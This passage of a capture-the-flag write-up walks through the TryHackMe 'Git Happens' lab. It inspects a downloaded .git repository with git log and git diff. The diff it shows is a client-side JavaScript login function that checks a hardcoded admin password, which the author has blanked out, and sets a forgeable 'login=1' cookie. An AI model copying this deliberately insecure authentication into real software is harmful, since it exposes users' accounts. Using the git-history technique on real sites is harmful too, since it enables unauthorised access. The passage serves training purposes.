drwxr-xr-x 1 daz daz  164 Sep 12 13:23 objects
-rw-r--r-- 1 daz daz  102 Jul 24 07:25 packed-refs
drwxr-xr-x 1 daz daz   52 Sep 12 13:23 refs
┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens/10.10.39.144]
└──╼ $
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running git without any flags shows the help output and some of available commands.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens/10.10.39.144]                     
└──╼ $git                                                                          
usage: git [--version] [--help] [-C &amp;lt;path&amp;gt;] [-c &amp;lt;name&amp;gt;=&amp;lt;value&amp;gt;]                    
           [--exec-path[=&amp;lt;path&amp;gt;]] [--html-path] [--man-path] [--info-path]         
           [-p | --paginate | -P | --no-pager] [--no-replace-objects] [--bare]     
           [--git-dir=&amp;lt;path&amp;gt;] [--work-tree=&amp;lt;path&amp;gt;] [--namespace=&amp;lt;name&amp;gt;]            
           &amp;lt;command&amp;gt; [&amp;lt;args&amp;gt;]                                                      
                                                                                   
These are common Git commands used in various situations:                          
                                                                                   
start a working area (see also: git help tutorial)
   clone             Clone a repository into a new directory
   init              Create an empty Git repository or reinitialize an existing one

work on the current change (see also: git help everyday)
   add               Add file contents to the index
   mv                Move or rename a file, a directory, or a symlink
   restore           Restore working tree files
   rm                Remove files from the working tree and from the index
   sparse-checkout   Initialize and modify the sparse-checkout

examine the history and state (see also: git help revisions)
   bisect            Use binary search to find the commit that introduced a bug
   diff              Show changes between commits, commit and working tree, etc
   grep              Print lines matching a pattern
   log               Show commit logs
   show              Show various types of objects
   status            Show the working tree status

grow, mark and tweak your common history
   branch            List, create, or delete branches
   commit            Record changes to the repository
   merge             Join two or more development histories together
   rebase            Reapply commits on top of another base tip
   reset             Reset current HEAD to the specified state
   switch            Switch branches
   tag               Create, list, delete or verify a tag object signed with GPG

collaborate (see also: git help workflows)
   fetch             Download objects and refs from another repository
   pull              Fetch from and integrate with another repository or a local branch
   push              Update remote refs along with associated objects

'git help -a' and 'git help -g' list available subcommands and some
concept guides. See 'git help &amp;lt;command&amp;gt;' or 'git help &amp;lt;concept&amp;gt;'
to read about a specific subcommand or concept.
See 'git help git' for an overview of the system.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;First I ran the ‘log’ command to check the commits.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens/10.10.39.144]             
└──╼ $git log                                                              
commit d0b3578a628889f38c0affb1b75457146a4678e5 (HEAD -&amp;gt; master, tag: v1.0)
Author: Adam Bertrand &amp;lt;hydragyrum@gmail.com&amp;gt;                               
Date:   Thu Jul 23 22:22:16 2020 +0000                                     
                                                                           
    Update .gitlab-ci.yml                                                  
                                                                           
commit 77aab78e2624ec9400f9ed3f43a6f0c942eeb82d                            
Author: Hydragyrum &amp;lt;hydragyrum@gmail.com&amp;gt;                                  
Date:   Fri Jul 24 00:21:25 2020 +0200                                     
                                                                           
    add gitlab-ci config to build docker file.                             
                                                                           
commit 2eb93ac3534155069a8ef59cb25b9c1971d5d199                            
Author: Hydragyrum &amp;lt;hydragyrum@gmail.com&amp;gt;                                  
Date:   Fri Jul 24 00:08:38 2020 +0200                                     
                                                                           
    setup dockerfile and setup defaults.                                   
                                                                           
commit d6df4000639981d032f628af2b4d03b8eff31213                            
Author: Hydragyrum &amp;lt;hydragyrum@gmail.com&amp;gt;                                  
Date:   Thu Jul 23 23:42:30 2020 +0200

    Make sure the css is standard-ish!

commit d954a99b96ff11c37a558a5d93ce52d0f3702a7d
Author: Hydragyrum &amp;lt;hydragyrum@gmail.com&amp;gt;
Date:   Thu Jul 23 23:41:12 2020 +0200

    re-obfuscating the code to be really secure!

commit bc8054d9d95854d278359a432b6d97c27e24061d
Author: Hydragyrum &amp;lt;hydragyrum@gmail.com&amp;gt;
Date:   Thu Jul 23 23:37:32 2020 +0200

    Security says obfuscation isn't enough.
    
    They want me to use something called 'SHA-512'

commit e56eaa8e29b589976f33d76bc58a0c4dfb9315b1
Author: Hydragyrum &amp;lt;hydragyrum@gmail.com&amp;gt;
Date:   Thu Jul 23 23:25:52 2020 +0200

    Obfuscated the source code.
    
    Hopefully security will be happy!

commit 395e087334d613d5e423cdf8f7be27196a360459
Author: Hydragyrum &amp;lt;hydragyrum@gmail.com&amp;gt;
Date:   Thu Jul 23 23:17:43 2020 +0200

    Made the login page, boss!

commit 2f423697bf81fe5956684f66fb6fc6596a1903cc
Author: Adam Bertrand &amp;lt;hydragyrum@gmail.com&amp;gt;
Date:   Mon Jul 20 20:46:28 2020 +0000

    Initial commit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Great, we can now see all the commits. Commits 2 and 3 look interesting, clearly the security team were not happy with the configuration, so lets take a look at the source code. I will use git diff to compare. We could also use git checkout.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens/10.10.39.144]
└──╼ $git diff 395e087334d613d5e423cdf8f7be27196a360459
&amp;lt;&amp;lt;SNIP&amp;gt;&amp;gt;
     &amp;lt;script&amp;gt;
-      function login() {
-        let form = document.getElementById(&quot;login-form&quot;);
-        console.log(form.elements);
-        let username = form.elements[&quot;username&quot;].value;
-        let password = form.elements[&quot;password&quot;].value;
-        if (
-          username === &quot;admin&quot; &amp;amp;&amp;amp;
-          password === &quot;&quot;
-        ) {
-          document.cookie = &quot;login=1&quot;;
-          window.location.href = &quot;/dashboard.html&quot;;
-        } else {
-          document.getElementById(&quot;error&quot;).innerHTML =
-            &quot;INVALID USERNAME OR PASSWORD!&quot;; 
-        }
-      }

&amp;lt;&amp;lt;SNIP&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Found it! Ive redacted it from the output as part of the TryHackMe write up rules however the password is part of the login function.&lt;/p&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><summary type="html"></summary></entry></feed>